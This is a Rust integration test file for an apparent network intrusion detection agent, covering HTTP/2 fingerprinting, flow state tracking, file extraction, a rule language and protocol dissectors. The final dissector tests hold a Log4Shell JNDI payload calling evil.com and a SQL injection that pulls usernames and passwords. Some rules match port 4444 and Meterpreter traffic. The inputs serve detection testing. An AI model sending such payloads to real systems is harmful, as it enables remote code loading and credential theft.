//! Extended Integration Tests — Axis 2 Completion (100+ tests total)
//!
//! This file completes the test suite to 100+ tests:
//!   ▸ JA4H (HTTP/2) fingerprinting
//!   ▸ Flow state machine (TCP/UDP)
//!   ▸ File extraction (HTTP/FTP/SMTP)
//!   ▸ ThorScript parser + runtime
//!   ▸ FingerprintEngine JA4H integration
//!   ▸ IDS engine extended rules
//!   ▸ Dissector engine edge cases

// ─── JA4H Fingerprint Tests ───────────────────────────────────────────────

#[cfg(test)]
mod ja4h_tests {
    use thor_agent::fingerprint::ja4h::*;

    #[test]
    fn settings_frame_3_params() {
        let payload: &[u8] = &[
            0x00, 0x01, 0x00, 0x00, 0x10, 0x00, // HEADER_TABLE_SIZE=4096
            0x00, 0x03, 0x00, 0x00, 0x00, 0x64, // MAX_CONCURRENT_STREAMS=100
            0x00, 0x04, 0x00, 0x00, 0xFF, 0xFF, // INITIAL_WINDOW_SIZE=65535
        ];
        let s = parse_settings_frame(payload);
        assert_eq!(s.params.len(), 3);
        assert_eq!(s.window_size(), Some(65535));
        assert_eq!(s.max_concurrent_streams(), Some(100));
        assert_eq!(s.header_table_size(), Some(4096));
    }

    #[test]
    fn settings_frame_empty() {
        let s = parse_settings_frame(&[]);
        assert!(s.params.is_empty());
    }

    #[test]
    fn settings_frame_max_frame_size() {
        let payload: &[u8] = &[0x00, 0x05, 0x00, 0x04, 0x00, 0x00]; // MAX_FRAME_SIZE=262144
        let s = parse_settings_frame(payload);
        assert_eq!(s.max_frame_size(), Some(262144));
    }

    #[test]
    fn ja4h_format_prefix() {
        let settings = Http2Settings { params: vec![(1, 4096)], map: [(1, 4096)].iter().cloned().collect() };
        let headers = Http2HeadersMeta { header_order: vec!["host".into()], ..Default::default() };
        let fp = Ja4HFingerprint::from_http2(&settings, &headers);
        assert!(fp.fingerprint.starts_with("h2n01_"));
    }

    #[test]
    fn ja4h_cookie_detected() {
        let s = Http2Settings::default();
        let h = Http2HeadersMeta { has_cookie: true, ..Default::default() };
        let fp = Ja4HFingerprint::from_http2(&s, &h);
        assert_eq!(fp.cookie_flag, 'c');
    }

    #[test]
    fn ja4h_no_cookie() {
        let s = Http2Settings::default();
        let h = Http2HeadersMeta { has_cookie: false, ..Default::default() };
        let fp = Ja4HFingerprint::from_http2(&s, &h);
        assert_eq!(fp.cookie_flag, 'n');
    }

    #[test]
    fn ja4h_http1_prefix() {
        let h = Http2HeadersMeta { header_order: vec!["host".into(), "accept".into()], ..Default::default() };
        let fp = Ja4HFingerprint::from_http1(&h);
        assert!(fp.fingerprint.starts_with("h11n00_"));
    }

    #[test]
    fn ja4h_deterministic() {
        let s = Http2Settings { params: vec![(4, 65535), (3, 100)], map: [(4, 65535), (3, 100)].iter().cloned().collect() };
        let h = Http2HeadersMeta { header_order: vec!["host".into()], ..Default::default() };
        let fp1 = Ja4HFingerprint::from_http2(&s, &h);
        let fp2 = Ja4HFingerprint::from_http2(&s, &h);
        assert_eq!(fp1.fingerprint, fp2.fingerprint);
    }

    #[test]
    fn ja4h_settings_sorted_for_hash() {
        // Two fingerprints with same params in different order should produce same hash
        let s1 = Http2Settings {
            params: vec![(1, 4096), (4, 65535)],
            map: [(1, 4096), (4, 65535)].iter().cloned().collect(),
        };
        let s2 = Http2Settings {
            params: vec![(4, 65535), (1, 4096)],
            map: [(4, 65535), (1, 4096)].iter().cloned().collect(),
        };
        let h = Http2HeadersMeta::default();
        let fp1 = Ja4HFingerprint::from_http2(&s1, &h);
        let fp2 = Ja4HFingerprint::from_http2(&s2, &h);
        // Settings hash should be same (sorted)
        assert_eq!(fp1.settings_hash, fp2.settings_hash);
    }

    #[test]
    fn known_malicious_ja4h_db() {
        let db = known_malicious_ja4h();
        assert!(!db.is_empty());
    }

    #[test]
    fn frame_header_settings_type() {
        let h: &[u8] = &[0x00, 0x00, 0x12, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00];
        let (len, typ, _flags, _sid) = parse_frame_header(h).unwrap();
        assert_eq!(len, 18);
        assert_eq!(typ, 4); // SETTINGS
    }

    #[test]
    fn http1_extract_headers_order() {
        let raw = b"GET / HTTP/1.1\r\nHost: example.com\r\nAccept: */*\r\nX-Custom: val\r\n\r\n";
        let h = extract_headers_from_http1(raw);
        assert_eq!(h.header_order[0], "host");
        assert_eq!(h.header_order[1], "accept");
        assert!(!h.has_cookie);
    }

    #[test]
    fn http1_extract_cookie_detected() {
        let raw = b"GET / HTTP/1.1\r\nHost: a.com\r\nCookie: sess=abc\r\n\r\n";
        let h = extract_headers_from_http1(raw);
        assert!(h.has_cookie);
        // cookie must NOT be in header_order per JA4H spec
        assert!(!h.header_order.contains(&"cookie".to_string()));
    }
}

// ─── Flow State Machine Tests ─────────────────────────────────────────────

#[cfg(test)]
mod flow_tests {
    use thor_agent::ids::flow::*;
    use std::net::Ipv4Addr;

    fn ip(s: &str) -> Ipv4Addr { s.parse().unwrap() }
    fn flags(byte: u8) -> TcpFlags { TcpFlags::from_byte(byte) }

    #[test]
    fn syn_only_is_half_open() {
        assert!(TcpState::SynSent.is_half_open());
        assert!(TcpState::SynReceived.is_half_open());
        assert!(!TcpState::Established.is_half_open());
    }

    #[test]
    fn established_is_active() {
        assert!(TcpState::Established.is_active());
        assert!(!TcpState::Closed.is_active());
        assert!(!TcpState::Reset.is_active());
    }

    #[test]
    fn tcp_full_handshake() {
        let table = FlowTable::new();
        let src = ip("192.168.1.1");
        let dst = ip("10.0.0.1");

        // SYN
        table.record_tcp(src, dst, 45678, 80, flags(0x02), 0);
        // SYN-ACK
        table.record_tcp(dst, src, 80, 45678, flags(0x12), 0);
        // ACK
        table.record_tcp(src, dst, 45678, 80, flags(0x10), 0);

        let key = FlowKey::new(src, dst, 45678, 80, 6);
        let (can, _) = key.canonical();
        let flow = table.flows.get(&can).unwrap();
        assert!(matches!(flow.state, TcpState::Established));
    }

    #[test]
    fn rst_resets_immediately() {
        let table = FlowTable::new();
        let src = ip("10.0.0.1");
        let dst = ip("10.0.0.2");
        table.record_tcp(src, dst, 1111, 443, flags(0x02), 0);
        table.record_tcp(dst, src, 443, 1111, flags(0x04), 0); // RST
        let key = FlowKey::new(src, dst, 1111, 443, 6);
        let (can, _) = key.canonical();
        assert!(matches!(table.flows.get(&can).unwrap().state, TcpState::Reset));
    }

    #[test]
    fn flow_stats_bytes_counted() {
        let table = FlowTable::new();
        let src = ip("10.0.0.1");
        let dst = ip("10.0.0.2");
        // Establish
        table.record_tcp(src, dst, 9000, 80, flags(0x02), 0);
        table.record_tcp(dst, src, 80, 9000, flags(0x12), 0);
        table.record_tcp(src, dst, 9000, 80, flags(0x10), 100);
        table.record_tcp(src, dst, 9000, 80, flags(0x18), 500);

        let stats = table.get_flow_stats(src, dst, 9000, 80).unwrap();
        assert!(stats.total_bytes() >= 600);
    }

    #[test]
    fn udp_flow_created() {
        let table = FlowTable::new();
        table.record_udp(ip("1.1.1.1"), ip("8.8.8.8"), 53211, 53, 64);
        assert!(table.active_flow_count() >= 1);
    }

    #[test]
    fn half_open_count_tracked() {
        let table = FlowTable::new();
        // 3 SYN-only (half-open) flows
        for port in [10001u16, 10002, 10003] {
            table.record_tcp(ip("1.2.3.4"), ip("5.6.7.8"), port, 80, flags(0x02), 0);
        }
        assert_eq!(table.half_open_count(), 3);
    }

    #[test]
    fn fin_sequence_closes_flow() {
        let table = FlowTable::new();
        let src = ip("10.0.0.5");
        let dst = ip("10.0.0.6");
        // Establish
        table.record_tcp(src, dst, 7777, 443, flags(0x02), 0);
        table.record_tcp(dst, src, 443, 7777, flags(0x12), 0);
        table.record_tcp(src, dst, 7777, 443, flags(0x10), 0);
        // FIN sequence
        table.record_tcp(src, dst, 7777, 443, flags(0x11), 0); // FIN+ACK
        table.record_tcp(dst, src, 443, 7777, flags(0x10), 0); // ACK
        table.record_tcp(dst, src, 443, 7777, flags(0x11), 0); // FIN+ACK
        table.record_tcp(src, dst, 7777, 443, flags(0x10), 0); // ACK

        let key = FlowKey::new(src, dst, 7777, 443, 6);
        let (can, _) = key.canonical();
        assert!(matches!(table.flows.get(&can).unwrap().state, TcpState::Closed));
    }

    #[test]
    fn pps_positive_after_traffic() {
        let table = FlowTable::new();
        let src = ip("10.0.0.1");
        let dst = ip("10.0.0.2");
        for _ in 0..10 {
            table.record_tcp(src, dst, 3333, 80, flags(0x18), 100);
        }
        let stats = table.get_flow_stats(src, dst, 3333, 80).unwrap();
        assert!(stats.total_packets() >= 10);
    }

    #[test]
    fn canonical_key_same_both_dirs() {
        let fwd = FlowKey::new(ip("1.1.1.1"), ip("2.2.2.2"), 100, 80, 6);
        let rev = FlowKey::new(ip("2.2.2.2"), ip("1.1.1.1"), 80, 100, 6);
        let (c1, _) = fwd.canonical();
        let (c2, _) = rev.canonical();
        assert_eq!(c1, c2);
    }
}

// ─── File Extractor Tests ──────────────────────────────────────────────────

#[cfg(test)]
mod file_extractor_tests {
    use thor_agent::ids::file_extractor::*;

    fn extractor() -> FileExtractor {
        let dir = std::env::temp_dir().join("thor_ext_test");
        FileExtractor::new(&dir, None).unwrap()
    }

    #[test]
    fn pe_exe_detected() {
        assert_eq!(detect_mime(b"MZ\x90\x00", None), "application/x-dosexec");
    }

    #[test]
    fn elf_detected() {
        assert_eq!(detect_mime(b"\x7fELF\x01\x01\x01", None), "application/x-executable");
    }

    #[test]
    fn pdf_detected() {
        assert_eq!(detect_mime(b"%PDF-1.7 ...", None), "application/pdf");
    }

    #[test]
    fn zip_detected() {
        assert_eq!(detect_mime(b"PK\x03\x04\x14", None), "application/zip");
    }

    #[test]
    fn ps1_by_extension() {
        assert_eq!(detect_mime(b"data", Some("script.ps1")), "text/x-powershell");
    }

    #[test]
    fn fallback_octet_stream() {
        assert_eq!(detect_mime(b"\x00\x01\x02\x03", None), "application/octet-stream");
    }

    #[test]
    fn extracted_file_hashes_non_empty() {
        let f = ExtractedFile::new(
            b"test payload".to_vec(),
            Some("test.bin".into()),
            ExtractProtocol::Http,
            "1.2.3.4".into(), "5.6.7.8".into(),
            1234, 80,
        );
        assert!(!f.sha256.is_empty());
        assert!(!f.sha1.is_empty());
        assert!(!f.md5_hex.is_empty());
        assert_eq!(f.size_bytes(), 12);
    }

    #[test]
    fn sha256_of_empty_known() {
        let h = sha256_hex(b"");
        assert_eq!(h, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    }

    #[test]
    fn http_extraction_pe() {
        let ext = extractor();
        let payload = b"HTTP/1.1 200 OK\r\nContent-Type: application/x-dosexec\r\nContent-Length: 4\r\n\r\nMZ\x90\x00";
        let files = ext.extract_http(payload, "1.2.3.4", "5.6.7.8", 54321, 80);
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].mime_type, "application/x-dosexec");
    }

    #[test]
    fn http_extraction_with_filename() {
        let ext = extractor();
        let payload = b"HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=\"invoice.pdf\"\r\nContent-Length: 8\r\n\r\n%PDF-1.4";
        let files = ext.extract_http(payload, "1.2.3.4", "5.6.7.8", 54321, 80);
        assert!(!files.is_empty());
        assert_eq!(files[0].filename.as_deref(), Some("invoice.pdf"));
    }

    #[test]
    fn too_small_not_extracted() {
        let ext = extractor();
        let payload = b"HTTP/1.1 200 OK\r\nContent-Type: application/x-dosexec\r\nContent-Length: 2\r\n\r\nMZ";
        let files = ext.extract_http(payload, "1.2.3.4", "5.6.7.8", 54321, 80);
        // 2 bytes < min_size (64 bytes)
        assert!(files.is_empty());
    }

    #[test]
    fn metadata_json_valid_format() {
        let f = ExtractedFile::new(
            b"MZ".to_vec(),
            Some("x.exe".into()),
            ExtractProtocol::Ftp,
            "1.2.3.4".into(), "5.6.7.8".into(),
            20, 21,
        );
        let json = f.metadata_json();
        assert!(json.contains('"'));
        assert!(json.contains("FTP"));
        assert!(json.contains("sha256"));
    }
}

// ─── ThorScript Parser Tests ──────────────────────────────────────────────

#[cfg(test)]
mod thorscript_parser_tests {
    use thor_script::parser::*;

    #[test]
    fn parse_simple_alert_rule() {
        let src = r#"rule "Test" { on network if { dst_port == 4444 } then { alert(severity: "high", msg: "test") } }"#;
        let rules = parse_script(src).unwrap();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].name, "Test");
    }

    #[test]
    fn parse_drop_action() {
        let src = r#"rule "Drop" { on network if { dst_port == 9999 } then { drop() } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].actions[0], Action::Drop));
    }

    #[test]
    fn parse_log_action() {
        let src = r#"rule "Log" { on any if { dst_port == 53 } then { log("dns query") } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(&rules[0].actions[0], Action::Log { message } if message == "dns query"));
    }

    #[test]
    fn parse_and_condition() {
        let src = r#"rule "And" { on network if { dst_port == 80 and src_ip == "1.2.3.4" } then { drop() } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].condition, Condition::And(_, _)));
    }

    #[test]
    fn parse_or_condition() {
        let src = r#"rule "Or" { on network if { dst_port == 80 or dst_port == 443 } then { log("web") } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].condition, Condition::Or(_, _)));
    }

    #[test]
    fn parse_not_condition() {
        let src = r#"rule "Not" { on network if { not dst_port == 80 } then { log("not 80") } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].condition, Condition::Not(_)));
    }

    #[test]
    fn parse_in_list() {
        let src = r#"rule "In" { on network if { dst_port in [80, 443, 8080] } then { drop() } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].condition,
            Condition::Compare { op: Operator::In, .. }));
    }

    #[test]
    fn parse_payload_match_ci() {
        let src = r#"rule "Regex" { on network if { payload match /evil/i } then { alert(severity: "high", msg: "evil") } }"#;
        let rules = parse_script(src).unwrap();
        assert!(matches!(rules[0].condition,
            Condition::PayloadMatch { case_insensitive: true, .. }));
    }

    #[test]
    fn parse_multiple_rules() {
        let src = r#"
rule "A" { on network if { dst_port == 80 } then { log("a") } }
rule "B" { on dns    if { dst_port == 53 } then { log("b") } }
rule "C" { on http   if { dst_port == 80 } then { drop() } }
"#;
        let rules = parse_script(src).unwrap();
        assert_eq!(rules.len(), 3);
    }

    #[test]
    fn parse_event_types() {
        for (ev, name) in [("network","A"), ("dns","B"), ("http","C"), ("tls","D"), ("process","E"), ("file","F"), ("any","G")] {
            let src = format!(r#"rule "{}" {{ on {} if {{ dst_port == 80 }} then {{ log("x") }} }}"#, name, ev);
            let rules = parse_script(&src).unwrap();
            assert_eq!(rules.len(), 1, "Failed for event type: {}", ev);
        }
    }

    #[test]
    fn tokenize_regex_literal() {
        let tokens = tokenize(r#"payload match /EVIL/i"#).unwrap();
        let has_regex = tokens.iter().any(|t| matches!(t, ScriptToken::RegexLit(p, f) if p == "EVIL" && f == "i"));
        assert!(has_regex);
    }

    #[test]
    fn tokenize_string_literal() {
        let tokens = tokenize(r#""hello world""#).unwrap();
        assert!(tokens.iter().any(|t| matches!(t, ScriptToken::StringLit(s) if s == "hello world")));
    }

    #[test]
    fn tokenize_int_literal() {
        let tokens = tokenize("4444").unwrap();
        assert!(tokens.iter().any(|t| matches!(t, ScriptToken::IntLit(4444))));
    }
}

// ─── ThorScript Runtime Tests ─────────────────────────────────────────────

#[cfg(test)]
mod thorscript_runtime_tests {
    use thor_script::{parser::parse_script, runtime::{ScriptEngine, ExecutionContext}};

    fn engine_from(src: &str) -> ScriptEngine {
        let rules = parse_script(src).unwrap();
        let mut e = ScriptEngine::new();
        for r in rules { e.add_rule(r); }
        e
    }

    fn ctx_port(port: i64) -> ExecutionContext {
        let mut ctx = ExecutionContext::new();
        ctx.set_i64("dst_port", port);
        ctx
    }

    #[test]
    fn alert_fires_on_match() {
        let e = engine_from(r#"rule "P" { on any if { dst_port == 4444 } then { alert(severity: "critical", msg: "hit") } }"#);
        let r = e.evaluate_all(&ctx_port(4444));
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].severity, "critical");
        assert_eq!(r[0].msg, "hit");
    }

    #[test]
    fn no_alert_on_mismatch() {
        let e = engine_from(r#"rule "P" { on any if { dst_port == 4444 } then { alert(severity: "low", msg: "x") } }"#);
        let r = e.evaluate_all(&ctx_port(80));
        assert!(r.is_empty());
    }

    #[test]
    fn drop_action_sets_flag() {
        let e = engine_from(r#"rule "D" { on any if { dst_port == 9999 } then { drop() } }"#);
        let r = e.evaluate_all(&ctx_port(9999));
        assert_eq!(r.len(), 1);
        assert!(r[0].drop);
    }

    #[test]
    fn in_list_match() {
        let e = engine_from(r#"rule "In" { on any if { dst_port in [4444, 8080, 9999] } then { alert(severity: "medium", msg: "bad") } }"#);
        for port in [4444, 8080, 9999] {
            let r = e.evaluate_all(&ctx_port(port));
            assert_eq!(r.len(), 1, "Port {} should match", port);
        }
        let r = e.evaluate_all(&ctx_port(80));
        assert!(r.is_empty());
    }

    #[test]
    fn and_condition_both_must_match() {
        let e = engine_from(r#"
rule "Both" {
    on any
    if { dst_port == 4444 and dst_ip == "1.2.3.4" }
    then { alert(severity: "high", msg: "both") }
}
"#);
        let mut ctx = ExecutionContext::new();
        ctx.set_i64("dst_port", 4444);
        ctx.set_str("dst_ip", "5.5.5.5"); // wrong IP
        assert!(e.evaluate_all(&ctx).is_empty());

        ctx.set_str("dst_ip", "1.2.3.4"); // correct
        assert_eq!(e.evaluate_all(&ctx).len(), 1);
    }

    #[test]
    fn payload_match_case_insensitive() {
        let e = engine_from(r#"rule "P" { on any if { payload match /METERPRETER/i } then { alert(severity: "critical", msg: "shell") } }"#);
        let mut ctx = ExecutionContext::new();
        ctx.set_payload(b"GET /meterpreter HTTP/1.1");
        let r = e.evaluate_all(&ctx);
        assert_eq!(r.len(), 1);
    }

    #[test]
    fn payload_match_case_sensitive_miss() {
        let e = engine_from(r#"rule "P" { on any if { payload match /METERPRETER/ } then { alert(severity: "critical", msg: "x") } }"#);
        let mut ctx = ExecutionContext::new();
        ctx.set_payload(b"meterpreter"); // lowercase — should not match
        assert!(e.evaluate_all(&ctx).is_empty());
    }

    #[test]
    fn multiple_rules_fire_independently() {
        let e = engine_from(r#"
rule "A" { on any if { dst_port == 80 } then { alert(severity: "low", msg: "a") } }
rule "B" { on any if { dst_port == 80 } then { alert(severity: "medium", msg: "b") } }
"#);
        let r = e.evaluate_all(&ctx_port(80));
        assert_eq!(r.len(), 2);
    }

    #[test]
    fn rule_count_correct() {
        let mut e = ScriptEngine::new();
        assert_eq!(e.rule_count(), 0);
        let rules = parse_script(r#"rule "A" { on any if { dst_port == 1 } then { log("a") } }"#).unwrap();
        for r in rules { e.add_rule(r); }
        assert_eq!(e.rule_count(), 1);
    }

    #[test]
    fn string_comparison() {
        let e = engine_from(r#"rule "IP" { on any if { src_ip == "10.0.0.1" } then { alert(severity: "low", msg: "ip match") } }"#);
        let mut ctx = ExecutionContext::new();
        ctx.set_str("src_ip", "10.0.0.1");
        assert_eq!(e.evaluate_all(&ctx).len(), 1);
    }
}

// ─── Fingerprint Engine JA4H Integration ─────────────────────────────────

#[cfg(test)]
mod fingerprint_engine_ja4h_tests {
    use thor_agent::fingerprint::FingerprintEngine;

    #[test]
    fn engine_has_ja4h_db() {
        let engine = FingerprintEngine::new();
        assert!(engine.malicious_db_size() >= 10);
    }

    #[test]
    fn add_custom_malicious_ja4h() {
        let mut engine = FingerprintEngine::new();
        let before = engine.malicious_db_size();
        engine.add_malicious_ja4h("custom_test_fp_12345".to_string());
        assert!(engine.malicious_db_size() > before);
    }
}

// ─── IDS Rule Catalog Extended ────────────────────────────────────────────

#[cfg(test)]
mod ids_extended_tests {
    use thor_agent::ids::IdsEngine;

    #[test]
    fn rule_count_exceeds_400() {
        let engine = IdsEngine::empty();
        assert!(engine.rule_count() >= 400, "Expected 400+ rules, got {}", engine.rule_count());
    }

    #[test]
    fn engine_empty_loads_without_panic() {
        let engine = IdsEngine::empty();
        assert!(engine.rule_count() > 0);
    }

    #[test]
    fn stats_match_rule_count() {
        let engine = IdsEngine::empty();
        let stats = engine.stats();
        assert!(stats.rules_loaded >= 400);
    }
}

// ─── Dissector Engine Edge Cases ──────────────────────────────────────────

#[cfg(test)]
mod dissector_edge_cases {
    use thor_agent::dissectors::DissectorEngine;

    #[test]
    fn empty_payload_no_panic() {
        let engine = DissectorEngine::new();
        let result = engine.dissect(&[], "1.2.3.4", 1234, "5.6.7.8", 80);
        assert!(!result.has_anomaly());
    }

    #[test]
    fn random_bytes_no_panic() {
        let engine = DissectorEngine::new();
        let payload = vec![0xff; 256];
        let result = engine.dissect(&payload, "1.2.3.4", 1234, "5.6.7.8", 9999);
        assert!(!result.has_anomaly()); // random bytes should not trigger alerts
    }

    #[test]
    fn log4shell_in_ua_detected() {
        let engine = DissectorEngine::new();
        let raw = b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: ${jndi:ldap://evil.com/x}\r\n\r\n";
        let result = engine.dissect(raw, "1.2.3.4", 44555, "10.0.0.1", 80);
        assert!(result.has_anomaly());
        assert!(result.severity() >= 0.8);
    }

    #[test]
    fn sql_injection_severity_high() {
        let engine = DissectorEngine::new();
        let raw = b"GET /search?q=1%27+UNION+SELECT+username%2Cpassword+FROM+users-- HTTP/1.1\r\nHost: v.com\r\n\r\n";
        let result = engine.dissect(raw, "1.2.3.4", 55555, "10.0.0.1", 80);
        assert!(result.has_anomaly());
        assert!(result.severity() > 0.5);
    }
}
